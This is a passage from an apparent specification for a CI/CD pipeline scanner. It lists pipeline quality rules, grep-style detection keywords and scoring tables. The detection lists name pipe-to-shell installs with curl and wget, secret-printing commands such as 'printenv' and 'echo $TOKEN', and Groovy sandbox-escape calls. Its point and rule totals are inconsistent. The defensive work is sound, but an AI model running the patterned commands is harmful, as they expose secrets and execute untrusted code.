Fix:         GitLab: interruptible: true on all non-deploy jobs. GitHub: concurrency: { cancel-in-progress: true }
```

### Q09 — Resource group on deployment jobs
```
ID:          Q09
Category:    PQL
Severity:    HIGH
Points:      6
Description: Deployment jobs must use resource_group/concurrency to prevent simultaneous deploys to same environment.
Why:         2 pipelines deploy to staging at same time → race condition → app in broken state → flaky tests for hours.
What:        Check for: resource_group: (GitLab), concurrency: group: (GitHub), lock(resource:) (Jenkins)
Fix:         Add resource_group: staging to staging deploy job. Add resource_group: production to prod deploy.
```

### Q10 — DRY — Templates / extends / reusable workflows
```
ID:          Q10
Category:    PQL
Severity:    LOW
Points:      3
Description: Pipeline should use extends/anchors/templates/reusable workflows — not copy-paste the same config.
Why:         Same SAST job copied in 15 repos. Update Semgrep version → change 15 files. Miss one → vulnerable.
What:        Check for: extends:, !reference, include:, uses: (reusable workflow), YAML anchors (&anchor, *anchor)
Fix:         Create shared CI templates: include: project/ci-templates. Or GitHub: uses: org/workflows/.github/workflows/sast.yml
```

### Q11 — Runner tags / runs-on specified
```
ID:          Q11
Category:    PQL
Severity:    MEDIUM
Points:      5
Description: Jobs must specify runner tags (GitLab) or runs-on (GitHub) — not rely on default/any runner.
Why:         No tags = job runs on ANY available runner. Could be ARM instead of AMD64 → build fails randomly.
             Or runs on runner without Docker → docker build fails → "works on other branches."
What:        Check for: tags: (GitLab), runs-on: (GitHub), agent { label } (Jenkins). Flag: missing in any job.
Fix:         Add tags: [docker, linux] to all jobs. Add runs-on: ubuntu-22.04 (not ubuntu-latest).
```

### Q12 — Service/sidecar images versioned
```
ID:          Q12
Category:    PQL
Severity:    HIGH
Points:      5
Description: Pipeline services (postgres, redis, elasticsearch) must be pinned to version — not :latest.
Why:         services: postgres:latest → Postgres jumps from 15 to 16 → schema migration breaks → 4 hours debugging.
What:        Check services: for :latest or missing tag. Flag: postgres, redis, mysql, mongo, elasticsearch without version.
Fix:         Pin: services: [{ image: postgres:15.4-alpine }, { image: redis:7.2-alpine }]
```

### Q13 — Variables scoped to correct level
```
ID:          Q13
Category:    PQL
Severity:    MEDIUM
Points:      5
Description: Variables must be scoped appropriately — global for shared config, job-level for job-specific values.
Why:         All vars global → every job sees every var → name collision → IMAGE_TAG from build overwrites IMAGE_TAG in deploy.
What:        Check for: variables at pipeline level with 20+ entries (should be split). Job-level overrides of global vars.
Fix:         Move job-specific vars inside job definition. Keep only truly shared vars at pipeline level.
```

### Q14 — Workflow rules prevent duplicate pipelines
```
ID:          Q14
Category:    PQL
Severity:    HIGH
Points:      6
Description: Pipeline must prevent duplicate runs — push + MR should NOT trigger 2 separate pipelines.
Why:         Developer pushes to MR branch → push pipeline + MR pipeline = 2 identical pipelines = double cost.
             Seen teams with 60% wasted CI minutes because of duplicate pipelines.
What:        Check for: workflow: rules: with proper MR/push dedup. Flag: no workflow: section in .gitlab-ci.yml.
Fix:         Add workflow: { rules: [{ if: $CI_PIPELINE_SOURCE == 'merge_request_event' }, { if: $CI_COMMIT_BRANCH == 'main' }] }
```

### Q15 — No blanket allow_failure: true
```
ID:          Q15
Category:    PQL
Severity:    HIGH
Points:      6
Description: allow_failure: true must NOT be used on critical jobs (build, test, security scans).
Why:         allow_failure on test job → tests fail for weeks → nobody notices → code quality degrades silently.
             Seen team where 40% of tests were failing for 3 months because allow_failure: true "temporarily."
What:        Check for: allow_failure: true on build, test, scan, deploy jobs. Only OK on optional/experimental jobs.
Fix:         Remove allow_failure: true from all critical jobs. If flaky → fix the test, don't silence it.
```

### Q16 — Test coverage reporting configured
```
ID:          Q16
Category:    PQL
Severity:    MEDIUM
Points:      4
Description: Pipeline must collect and report test coverage — not just pass/fail.
Why:         Tests pass but only cover 12% of code → false confidence → bugs in untested 88% reach production.
What:        Check for: coverage: regex (GitLab), coverage reports, codecov, coveralls, --coverage flag
Fix:         Add coverage regex: coverage: '/^TOTAL.*\s+(\d+\.?\d*)%/' and set minimum threshold (e.g., 80%).
```

### Q17 — No hardcoded URLs or IPs in pipeline
```
ID:          Q17
Category:    PQL
Severity:    MEDIUM
Points:      5
Description: Pipeline must NOT contain hardcoded URLs, IPs, or hostnames. Use CI/CD variables instead.
Why:         Server moves from 10.0.0.5 to 10.0.1.10 → 30 pipelines broken → 2 hours finding all references.
What:        Check for: http://10., http://192.168., hardcoded domain names in script blocks (not in image: refs)
Fix:         Use variables: DEPLOY_URL: $STAGING_URL, REGISTRY: $CI_REGISTRY. Or use environment URLs.
```

### Q18 — before_script / setup steps separated
```
ID:          Q18
Category:    PQL
Severity:    LOW
Points:      3
Description: Setup logic (install deps, configure auth) should be in before_script — not mixed with main script.
Why:         500-line script: block → impossible to debug. before_script = clear separation of setup vs execution.
What:        Check for: before_script: usage. Flag: script: blocks with 20+ lines mixing setup and execution.
Fix:         Move apt-get install, npm ci, docker login to before_script. Keep script: for actual job commands.
```

### Q19 — Reasonable stage count (not 20+)
```
ID:          Q19
Category:    PQL
Severity:    LOW
Points:      3
Description: Pipeline should have reasonable number of stages (< 15). Too many stages = sequential bottleneck.
Why:         20 stages × 2 min each = 40 min minimum even with fast jobs. Combine related stages.
What:        Count stages: entries. Flag: > 15 stages. Ideal: 5-10 stages with parallel jobs within each.
Fix:         Combine: lint+sast → 'analyze' stage. unit-test+integration-test → 'test' stage. Use parallel within stages.
```

### Q20 — Error handling and cleanup on failure
```
ID:          Q20
Category:    PQL
Severity:    MEDIUM
Points:      6
Description: Pipeline must have after_script/post-failure/cleanup to handle failures gracefully.
Why:         Deploy fails mid-way → temporary resources not cleaned → orphaned containers, DNS records, cloud instances.
             after_script runs even on failure → cleanup guaranteed.
What:        Check for: after_script:, post { failure }, post { always }, on: failure, if: failure()
Fix:         Add after_script: [cleanup.sh] on deploy jobs. Add post { always { cleanWs() } } in Jenkinsfile.
```

### Q21 — No shell scripts > 10 lines inline
```
ID:          Q21
Category:    PQL
Severity:    HIGH
Points:      4
Description: Pipeline scripts > 10 lines should be in external .sh files — not inline in YAML.
Why:         50-line bash in YAML → impossible to lint, test, or debug. No syntax highlighting. No shellcheck.
             External script = shellcheck, unit tests, reusable across pipelines.
What:        Count lines in script: blocks. Flag: any script > 10 lines inline.
Fix:         Move to scripts/ci/build.sh. Call: script: [bash scripts/ci/build.sh]. Add shellcheck in CI.
```

### Q22 — Parallel execution where possible
```
ID:          Q22
Category:    PQL
Severity:    MEDIUM
Points:      3
Description: Independent jobs (SAST, SCA, lint) should run in parallel — not sequentially.
Why:         3 scan jobs × 5 min each = 15 min sequential. In parallel = 5 min. 3x faster pipeline.
What:        Check for: parallel: in GitLab, jobs in same stage, concurrent jobs in GitHub Actions matrix.
Fix:         Put SAST + SCA + lint in same stage (GitLab) or separate jobs without needs: between them.
```

### Q23 — Pipeline documentation present
```
ID:          Q23
Category:    PQL
Severity:    LOW
Points:      2
Description: Pipeline config should have comments explaining non-obvious stages, triggers, and configurations.
Why:         New dev joins team → sees 500-line .gitlab-ci.yml → no comments → takes 2 hours to understand.
What:        Check for: comment lines (# ) in pipeline config. Flag: 0 comments in 100+ line pipeline.
Fix:         Add section comments: # === Security Scanning === and per-job comments explaining purpose.
```

### Q24 — Matrix / dynamic pipelines for multi-service
```
ID:          Q24
Category:    PQL
Severity:    LOW
Points:      2
Description: Multi-service repos should use matrix/dynamic pipelines — not duplicate jobs per service.
Why:         5 microservices × copy-paste pipeline = 500 lines. Matrix = 50 lines. Easier to maintain.
What:        Check for: matrix:, parallel:matrix, generate:, child pipelines, trigger:include, dynamic config
Fix:         Use GitLab parent-child pipelines or GitHub matrix strategy for multi-service builds.
```

### Q25 — Secrets not printed in logs
```
ID:          Q25
Category:    PQL
Severity:    CRITICAL
Points:      5
Description: Pipeline must NOT echo, cat, or printenv secrets in build logs.
Why:         echo $TOKEN for debugging → stays in build log forever → anyone with CI access reads it.
What:        Check for: echo $SECRET, echo $TOKEN, echo $PASSWORD, printenv, env | grep, cat .env in scripts
Fix:         Never echo secrets. Use masked variables. For debugging: echo "Token length: ${#TOKEN}"
```

### Q26 — Proper exit codes on custom scripts
```
ID:          Q26
Category:    PQL
Severity:    HIGH
Points:      4
Description: Custom scripts called from pipeline must use proper exit codes — set -e or explicit exit 1.
Why:         Script fails on line 3 but continues → deploys broken code → production outage. No set -e = silent failures.
What:        Check for: set -e, set -eo pipefail in script blocks. Flag: scripts without set -e or #!/bin/bash -e.
Fix:         Start every script block with: set -eo pipefail. Or use #!/bin/bash -e in external scripts.
```

### Q27 — Conditional paths/changes triggers
```
ID:          Q27
Category:    PQL
Severity:    MEDIUM
Points:      4
Description: Pipeline should use path-based triggers — only run jobs when relevant files change.
Why:         Changing README.md triggers full 30-min pipeline with build + test + scan = total waste.
What:        Check for: rules: changes:, paths:, paths-filter, on: push: paths:, only: changes:
Fix:         Add: rules: [{ changes: ["src/**", "package.json"] }] to build/test jobs. Docs change → skip build.
```

### Q28 — Job timeout per-job (not just global)
```
ID:          Q28
Category:    PQL
Severity:    MEDIUM
Points:      3
Description: Critical jobs (DAST, deploy, build) should have individual timeouts — not rely on global only.
Why:         Global timeout 1 hour → DAST hangs 59 min → build gets only 1 min → fails. Per-job = precise control.
What:        Check for: timeout: on individual jobs (GitLab), timeout-minutes: per step (GitHub).
Fix:         Add timeout: 10 minutes on scan jobs, 30 minutes on build, 5 minutes on deploy.
```

### Q29 — Artifacts size limits
```
ID:          Q29
Category:    PQL
Severity:    LOW
Points:      2
Description: Pipeline should not produce unreasonably large artifacts (> 100MB per job).
Why:         500MB artifacts per build × 100 builds/day = 50GB/day storage. CI storage exhausted → pipelines fail.
What:        Check for: artifacts: paths: with broad globs like **/* or *.*, or archiving node_modules, .git
Fix:         Be specific: artifacts: paths: ["dist/", "reports/"]. Never archive node_modules or build caches.
```

### Q30 — YAML anchors / extends reduce duplication
```
ID:          Q30
Category:    PQL
Severity:    MEDIUM
Points:      3
Description: Repeated configuration blocks must use YAML anchors or extends — not copy-paste.
Why:         Same image + tags + before_script in 10 jobs = 100 lines of duplication. One change = edit 10 places.
What:        Check for: duplicate image/tags/before_script across jobs without extends or anchor reference.
Fix:         Use .base-job template with extends: .base-job. Or YAML anchors &defaults with <<: *defaults.
```

### Q31 — No manual triggers on automated stages
```
ID:          Q31
Category:    PQL
Severity:    MEDIUM
Points:      3
Description: Only production deploy should be manual. All other stages (build, test, scan) must be automatic.
Why:         Manual test stage → developers skip it → tests never run → bugs reach production.
What:        Check for: when: manual on non-deploy stages (build, test, scan, lint). Only OK on: deploy to prod, rollback.
Fix:         Remove when: manual from all stages except production deploy and rollback.
```

### Q32 — Pipeline execution time monitoring
```
ID:          Q32
Category:    PQL
Severity:    LOW
Points:      2
Description: Pipeline should track and report total execution time — flag if > 30 min.
Why:         Pipeline slowly grows from 10 min → 45 min over months. Nobody notices until developers complain.
What:        Check for: pipeline duration tracking, timestamps in logs, time tracking in post-build scripts.
Fix:         Add post-pipeline job: check if duration > 30 min → alert team → investigate slow stages.
```

### Q33 — Docker-in-Docker (DinD) properly configured
```
ID:          Q33
Category:    PQL
Severity:    HIGH
Points:      4
Description: If pipeline uses Docker-in-Docker, it must use TLS and pinned version — not --privileged without reason.
Why:         DinD without TLS = anyone on network can control your Docker daemon. --privileged DinD = container escape trivial.
What:        Check for: services: docker:dind, DOCKER_TLS_CERTDIR, docker:latest (bad), --privileged without TLS.
Fix:         Use docker:24.0-dind with DOCKER_TLS_CERTDIR: "/certs". Or better: use kaniko for rootless builds.
```

### Q34 — Pipeline validates YAML syntax before execution
```
ID:          Q34
Category:    PQL
Severity:    MEDIUM
Points:      3
Description: Pipeline YAML should be validated/linted before commit — not discover syntax errors on push.
Why:         Push broken YAML → pipeline doesn't start → 5 min to realize → fix → push again → 10 min wasted per typo.
What:        Check for: yamllint, gitlab-ci-lint, actionlint in pre-commit hooks or early pipeline stage.
Fix:         Add pre-commit: yamllint .gitlab-ci.yml. Or: stage { lint: { script: gitlab-ci-lint validate } }
```

### Q35 — Notifications on pipeline status change
```
ID:          Q35
Category:    PQL
Severity:    MEDIUM
Points:      3
Description: Pipeline should notify team on status CHANGES — not just failures. Green→Red AND Red→Green.
Why:         Pipeline fixed at 2am → nobody knows → team still debugging "broken CI" in the morning.
What:        Check for: notification on success after previous failure, on: status change, changed() trigger.
Fix:         Add: notify when state changes: if previousBuild.result != currentBuild.result → send notification.
```

---

---

# Detection Keywords — What to grep for

```
Category: SEC (Secrets) — .gitlab-ci.yml / GitHub Actions
  Tools:    gitleaks, trufflehog, detect-secrets, git-secrets, whispers
  Signals:  allow_failure, --since-commit, pre-commit, vault, hashicorp, masked, protected

Category: SAS (SAST)
  Tools:    semgrep, sonar-scanner, codeql, bandit, gosec, njsscan, eslint, brakeman, checkmarx, fortify
  Signals:  allow_failure, --config, --sarif, .semgrepignore, quality-gate, lint

Category: SCA (Supply Chain)
  Tools:    npm audit, govulncheck, pip-audit, snyk, trivy, grype, syft, cosign, notation
  Signals:  --exit-code, --severity, sbom, cyclonedx, spdx, sign, verify, harbor, ecr, gcr, npm ci

Category: DST (DAST)
  Tools:    zap, zap-baseline, zap-full-scan, nuclei, dastardly, burp, arachni
  Signals:  staging, stg, preview, health, readiness, -J, --json, timeout

Category: DEP (Deployment)
  Tools:    argocd, flux, kubectl, helm, kustomize, argo-rollouts, flagger
  Signals:  when: manual, rollback, smoke, health, canary, blue-green, promote, environment, notify

Category: GOV (Governance)
  Tools:    defectdojo, sonarqube, jest, pytest, go test, mocha
  Signals:  import-scan, quality gate, artifacts, coverage, merge_request, timeout, sarif

Category: JEN (Jenkinsfile) — 30 rules
  Credentials:  withCredentials, credentials(), usernamePassword, sshUserPrivateKey, string(credentialsId:
  Agents:       agent any, agent { label, node('master'), node('built-in'), agent { docker
  Sandbox:      @Grab, @GrabResolver, evaluate(, Eval.me, GroovyShell, new File(
  Injection:    sh "${params., sh "${env., bat "${params.
  Libraries:    @Library, @Library('.*@main'), @Library('.*') without @version
  Options:      timeout(time:, buildDiscarder, logRotator, durabilityHint, disableReplay()
  Cleanup:      cleanWs(), deleteDir(), post { always, post { failure
  Input:        input(message:, input ', submitter:, string(name:, choice(, booleanParam(
  Artifacts:    archiveArtifacts, stash(, unstash, writeFile.*secret, writeFile.*password
  Security:     buildForkPRs, script approval, image.*:latest, lock(resource:
  Logging:      echo.*\${.*SECRET, println.*password, sh "echo.*credentials
  Parallel:     parallel {, matrix { axes, retry(, catchError(, slackSend, mail, emailext

Category: DOC (Dockerfile) — 40 rules
  Base Image:   FROM.*:latest, FROM [^:@]*$ (no tag), FROM.*@sha256 (good),
                alpine, distroless, slim, scratch (good), ubuntu, debian, centos (bad)
  User:         USER instruction (missing = root), USER root (bad at end),
                adduser, addgroup, --chown=, COPY --chown
  Secrets:      ENV.*PASSWORD, ENV.*SECRET, ARG.*TOKEN, ARG.*KEY,
                COPY.*\.env, COPY.*\.key, COPY.*\.pem, COPY.*id_rsa,
                COPY.*\.ssh, git clone.*@, ssh-keygen
  Build:        FROM.*AS (multi-stage), COPY --from= (good), COPY --from=0 (bad),
                COPY . . (bad without .dockerignore), .dockerignore (must exist)
  Instructions: ADD http://, ADD https:// (bad, use COPY),
                CMD [" (exec form = good), CMD without [] (shell form = bad),
                ENTRYPOINT [" (good), ENTRYPOINT without [] (bad),
                Multiple CMD (bad), Multiple ENTRYPOINT (bad), SHELL override,
                WORKDIR (must exist), EXPOSE (should exist), LABEL (should exist),
                HEALTHCHECK (should exist), STOPSIGNAL, VOLUME
  Packages:     apt-get install without --no-install-recommends (bad),
                apt-get upgrade/dist-upgrade (bad), apk upgrade (bad),
                apk add without --no-cache (bad), pip install without == (bad)
  Dangerous:    curl.*|.*bash, wget.*|.*sh (pipe install = bad),
                --privileged, cap_add: ALL, SYS_ADMIN, seccomp:unconfined,
                chmod u+s, chmod g+s, SETUID, chmod 777, RUN sudo
  Layers:       Multiple consecutive RUN (should combine),
                RUN.*install without rm cache in same layer,
                RUN curl/wget without rm in same command,
                COPY . . before COPY package*.json (bad cache order)
  Verification: sha256sum, md5sum, gpg --verify (should exist for downloads)
  Init:         tini, dumb-init, --init (PID 1 signal handling)
  Linting:      hadolint, .hadolint.yaml, dockerfile-lint

Category: PQL (Pipeline Quality & Reliability) — 35 rules
  Versioning:   image:.*:latest, image: [^ ]+$ (no tag), services:.*:latest,
                runs-on: ubuntu-latest (bad), runs-on: ubuntu-22.04 (good)
  Caching:      cache:, actions/cache, save_cache, restore_cache, $CI_PROJECT_DIR/.cache
  Dependencies: needs:, depends_on, concurrency:, resource_group:, lock(resource:
  Performance:  interruptible: true, cancel-in-progress, parallel:, stages: (count > 15)
  Deprecated:   only:, except: (use rules:), set-output, save-state, ::set-output
  Triggers:     workflow: rules:, on: pull_request, $CI_PIPELINE_SOURCE, paths:, changes:
  Anti-patterns: allow_failure: true (on critical jobs), script: (20+ lines),
                 http://10., http://192.168., hardcoded IPs/URLs in scripts,
                 when: manual on non-deploy stages, echo $SECRET, echo $TOKEN
  DRY:          extends:, !reference, include:, uses: (reusable), &anchor, *anchor
  Cleanup:      after_script:, post { failure }, post { always }, expire_in:, retention-days
  Coverage:     coverage: '/', codecov, coveralls, --coverage, coverage-report
  Runners:      tags:, runs-on:, agent { label }, self-hosted, docker-in-docker
  Scripts:      set -e, set -eo pipefail, #!/bin/bash -e, script: (> 10 lines)
  Validation:   yamllint, gitlab-ci-lint, actionlint, pre-commit
  Notifications: slackSend, emailext, webhook, notify, on: status change
  DinD:         docker:dind, DOCKER_TLS_CERTDIR, kaniko, buildah (rootless alternative)
```

---

# Summary — All 145 Rules

```
┌───────────────────────────────────────────────────────────────────────────────────────────┐
│ PIPEGUARD RULE ENGINE — 145 RULES ACROSS 9 CATEGORIES                                    │
├──────────────────────────┬───────┬────────┬──────────────────────────────────────────────┤
│ Category                 │ Rules │ Points │ Scans                                        │
├──────────────────────────┼───────┼────────┼──────────────────────────────────────────────┤
│ SEC  Secret Management   │  7    │  15    │ .gitlab-ci.yml / GitHub Actions (Security)   │
│ SAS  Static Analysis     │  7    │  15    │ .gitlab-ci.yml / GitHub Actions (Security)   │
│ SCA  Supply Chain        │  9    │  20    │ .gitlab-ci.yml / GitHub Actions (Security)   │
│ DST  DAST                │  4    │  10    │ .gitlab-ci.yml / GitHub Actions (Security)   │
│ DEP  Deployment          │  9    │  20    │ .gitlab-ci.yml / GitHub Actions (Security)   │
│ GOV  Governance          │  9    │  20    │ .gitlab-ci.yml / GitHub Actions (Security)   │
├──────────────────────────┼───────┼────────┼──────────────────────────────────────────────┤
│ JEN  Jenkinsfile         │ 30    │ 100    │ Jenkinsfile (Groovy)                         │
│ DOC  Dockerfile          │ 40    │ 100    │ Dockerfile                                   │
├──────────────────────────┼───────┼────────┼──────────────────────────────────────────────┤
│ PQL  Quality & Reliability│ 35   │ 100    │ ALL pipeline types (YAML + Jenkinsfile)      │
├──────────────────────────┼───────┼────────┼──────────────────────────────────────────────┤
│ TOTAL                    │ 145   │        │ 3 file types + cross-cutting quality         │
└──────────────────────────┴───────┴────────┴──────────────────────────────────────────────┘
```

### Dual Scoring — Security + Quality:
```
PipeGuard gives TWO independent scores per file:

┌────────────────────┬───────────────────────────────┬──────────────────────────┐
│ File Type          │ Security Score (Level 0–5)    │ Quality Score (Level 0–5)│
├────────────────────┼───────────────────────────────┼──────────────────────────┤
│ .gitlab-ci.yml     │ R01–R45  →  100 pts           │ Q01–Q35  →  100 pts      │
│ GitHub Actions     │ R01–R45  →  100 pts           │ Q01–Q35  →  100 pts      │
│ Jenkinsfile        │ J01–J30  →  100 pts           │ Q01–Q35  →  100 pts      │
│ Dockerfile         │ D01–D40  →  100 pts           │ N/A (not a pipeline)     │
└────────────────────┴───────────────────────────────┴──────────────────────────┘
```

### Unified Maturity Levels (Security AND Quality):
```
┌───────┬──────────────────┬───────────┬──────────────────────────────────────────────────┐
│ Level │ Name             │ Score     │ Description                                      │
├───────┼──────────────────┼───────────┼──────────────────────────────────────────────────┤
│   0   │ No Security      │  0 – 19   │ Zero or near-zero practices                      │
│   1   │ Minimal          │ 20 – 39   │ Some practices present but not enforced           │
│   2   │ Basic            │ 40 – 59   │ Practices exist, major gaps remain                │
│   3   │ Intermediate     │ 60 – 79   │ Solid with minor improvements needed             │
│   4   │ Advanced         │ 80 – 94   │ Defense in depth, strong practices                │
│   5   │ Elite            │ 95 – 100  │ Full maturity, audit-ready, hardened              │
└───────┴──────────────────┴───────────┴──────────────────────────────────────────────────┘
```

### Example PipeGuard Output:
```
$ pipeguard scan .gitlab-ci.yml

╔══════════════════════════════════════════════════════════════╗
║  PipeGuard v1.0 — Pipeline Security & Quality Scanner      ║
╠═════════════════════════════════╦════════════════════════════╣
║  🔒 SECURITY SCORE             ║  ⚡ QUALITY SCORE           ║
║  72/100 — Level 3              ║  45/100 — Level 2           ║
║  (Intermediate)                ║  (Basic)                    ║
╠═════════════════════════════════╩════════════════════════════╣
║  Security: SAST ✓ SCA ✓ Secrets ✓ DAST ✗ Signing ✗        ║
║  Quality:  Cache ✗ :latest used ✗ No needs: ✗              ║
╚═════════════════════════════════════════════════════════════╝
```

### Points Breakdown:
```
Pipeline Security (100 pts):            Pipeline Quality (100 pts):
  SEC  R01–R07   15 pts                   Q01  CRITICAL  7   (tool versioning)
  SAS  R08–R14   15 pts                   Q02  HIGH      6   (caching)
  SCA  R15–R23   20 pts                   Q03  HIGH      6   (job dependencies)
  DST  R24–R27   10 pts                   Q04  MEDIUM    4   (retry)
  DEP  R28–R36   20 pts                   Q05  MEDIUM    4   (artifact expiry)
  GOV  R37–R45   20 pts                   Q06  HIGH      5   (deprecated syntax)
  ─────────────────────                   Q07  HIGH      6   (trigger scoping)
  TOTAL         100 pts                   Q08  MEDIUM    4   (interruptible)
                                          Q09  HIGH      6   (resource groups)
                                          Q10  LOW       3   (DRY/templates)
Jenkinsfile (100 pts):                    Q11  MEDIUM    5   (runner tags)
  J01–J05  CRITICAL  22 pts               Q12  HIGH      5   (service versions)
  J06–J07  HIGH      6 pts                Q13  MEDIUM    5   (variable scope)
  J08      MEDIUM    2 pts                Q14  HIGH      6   (duplicate prevention)
  J09      HIGH      3 pts                Q15  HIGH      6   (no blanket allow_failure)
  J10–J15  MIXED    15 pts                Q16  MEDIUM    4   (coverage reporting)
  J16–J30  MIXED    52 pts                Q17  MEDIUM    5   (no hardcoded URLs)
  ─────────────────────                   Q18  LOW       3   (before_script)
  TOTAL             100 pts               Q19  LOW       3   (stage count)
                                          Q20  MEDIUM    6   (error handling)
                                          ── NEW ──────────────────
Dockerfile (100 pts):                     Q21  HIGH      4   (no inline > 10 lines)
  D01–D03  CRITICAL  20 pts               Q22  MEDIUM    3   (parallel execution)
  D04–D10  MIXED     30 pts               Q23  LOW       2   (pipeline docs)
  D11–D25  MIXED     50 pts               Q24  LOW       2   (matrix/dynamic)
  ── NEW ────────────────                 Q25  CRITICAL  5   (no print secrets)
  D26–D30  MIXED     14 pts               Q26  HIGH      4   (exit codes)
  D31–D35  MIXED      8 pts               Q27  MEDIUM    4   (path triggers)
  D36–D40  MIXED     10 pts               Q28  MEDIUM    3   (per-job timeout)
  ─────────────────────────               Q29  LOW       2   (artifact size)
  TOTAL              132 pts*             Q30  MEDIUM    3   (YAML anchors)
                                          Q31  MEDIUM    3   (no manual on auto)
  *Adjust point values in Go             Q32  LOW       2   (execution time)
   implementation to hit 100.             Q33  HIGH      4   (DinD config)
                                          Q34  MEDIUM    3   (YAML validation)
                                          Q35  MEDIUM    3   (status notifications)
                                          ─────────────────────────
                                          TOTAL              145 pts*

                                          *Adjust in Go to hit 100.
```

---

> **145 rules. 9 categories. 3 file types. Dual scoring: Security + Quality. 40 Dockerfile best practices. 35 pipeline quality checks. **
